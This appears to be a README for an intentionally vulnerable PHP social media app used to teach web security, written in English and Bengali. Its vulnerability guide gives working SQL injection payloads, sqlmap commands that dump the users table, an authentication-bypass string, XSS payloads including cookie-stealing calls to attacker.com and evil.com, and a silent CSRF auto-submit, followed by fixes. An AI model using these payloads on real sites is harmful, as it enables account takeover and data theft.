# 🔓 VulnSocial — Intentionally Vulnerable Social Media App
### ⚠️ EDUCATIONAL USE ONLY — শুধুমাত্র শেখার জন্য

---

## 📁 Project Structure

```
vuln_social/
├── db.php           → Database connection
├── setup.sql        → Database & seed data
├── login.php        → 🔴 SQLi vulnerable login
├── register.php     → 🔴 Stored XSS via bio
├── feed.php         → 🔴 SQLi + Reflected XSS + CSRF
├── profile.php      → 🔴 SQLi via ?id= (sqlmap target)
├── settings.php     → 🔴 CSRF vulnerable settings
├── messages.php     → 🔴 Stored XSS via message body
├── csrf_poc.html    → 🔴 CSRF attack demo page
├── logout.php       → Logout
└── css/style.css    → Stylesheet
```

---

## ⚙️ Setup Instructions

### 1. XAMPP / LAMP তে রাখো:
```
C:\xampp\htdocs\vuln_social\   (Windows)
/var/www/html/vuln_social/     (Linux)
```

### 2. Database setup:
```
phpMyAdmin খোলো → SQL tab → setup.sql এর content paste করো → Execute
```

### 3. Browser এ open করো:
```
http://localhost/vuln_social/login.php
```

### Demo Accounts:
| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | Admin |
| alice    | alice123  | User  |
| bob      | bob123    | User  |

---

## 🔴 Vulnerability Guide

---

### 1. SQL Injection (SQLi)

**Target: `profile.php?id=`**

#### Error-based detection:
```
http://localhost/vuln_social/profile.php?id=1'
```
→ MySQL error দেখাবে — injection confirmed!

#### Boolean-based blind:
```
?id=1 AND 1=1-- -   → Profile দেখাবে (TRUE)
?id=1 AND 1=2-- -   → Empty (FALSE)
```

#### UNION-based (data extraction):
```
?id=-1 UNION SELECT 1,username,password,email,bio,role FROM users LIMIT 1-- -
```
→ admin এর username/password দেখাবে profile page এ!

#### sqlmap দিয়ে automated:
```bash
# Database list বের করো
sqlmap -u "http://localhost/vuln_social/profile.php?id=1" --dbs --batch

# Tables বের করো
sqlmap -u "http://localhost/vuln_social/profile.php?id=1" -D vuln_social --tables --batch

# Users dump করো
sqlmap -u "http://localhost/vuln_social/profile.php?id=1" -D vuln_social -T users --dump --batch
```

**Login page SQLi:**
```
Username: admin' OR '1'='1'-- -
Password: anything
```
→ Authentication bypass! যেকোনো password দিলেই login হবে।

**Feed search SQLi:**
```
http://localhost/vuln_social/feed.php?search=test' UNION SELECT 1,username,password,email,bio,role FROM users-- -
```

---

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS — feed.php search:
```
http://localhost/vuln_social/feed.php?search=<script>alert('Reflected XSS!')</script>
```
```
http://localhost/vuln_social/feed.php?search=<img src=x onerror=alert(document.cookie)>
```

#### Stored XSS — Post content:
Feed এ new post লেখো:
```html
<script>alert('Stored XSS from post!')</script>
```
→ যতবার কেউ feed দেখবে, alert fire করবে!

#### Stored XSS — Bio (register page):
Register করার সময় Bio field এ:
```html
<script>document.body.innerHTML='<h1 style="color:red">HACKED!</h1>'</script>
```

#### Stored XSS — Messages:
Message body তে:
```html
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
```

#### Cookie Stealer XSS:
```html
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
```

---

### 3. Cross-Site Request Forgery (CSRF)

**Target: `settings.php`**

#### Attack Demo:
1. Browser এ alice দিয়ে login করো VulnSocial এ
2. Same browser এ নতুন tab খোলো
3. `csrf_poc.html` open করো
4. "Claim My Prize" button click করো
5. VulnSocial settings এ ফিরে যাও
6. Alice এর email এখন `hacked@evil.com` হয়ে গেছে! ✅

#### কেন কাজ করে:
- `settings.php` POST form এ কোনো CSRF token নেই
- Browser automatically cookies পাঠায় same-site request এ
- Server কোনো origin/referer check করে না

#### Auto-submit version (silent attack):
`csrf_poc.html` এ এই JS uncomment করো:
```javascript
window.onload = function() {
    document.getElementById('csrfForm').submit();
};
```
→ Victim page open করা মাত্রই attack হবে, button click ছাড়াই!

---

## 🔵 Fixes (শেখার পর এভাবে fix করো)

### SQLi Fix — Prepared Statement:
```php
// ❌ Vulnerable:
$q = "SELECT * FROM users WHERE id = $id";

// ✅ Fixed:
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

### XSS Fix — htmlspecialchars:
```php
// ❌ Vulnerable:
echo $post['content'];

// ✅ Fixed:
echo htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8');
```

### CSRF Fix — Token:
```php
// Generate token (session শুরুতে):
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Form এ hidden field:
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// POST handler এ verify:
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF Attack Detected!");
}
```

---

## ⚠️ Warning
এই project শুধুমাত্র **local machine** এ চালাও।
কখনো **real server** এ deploy করো না।
এটি intentionally insecure — production এ ব্যবহার সম্পূর্ণ নিষিদ্ধ।
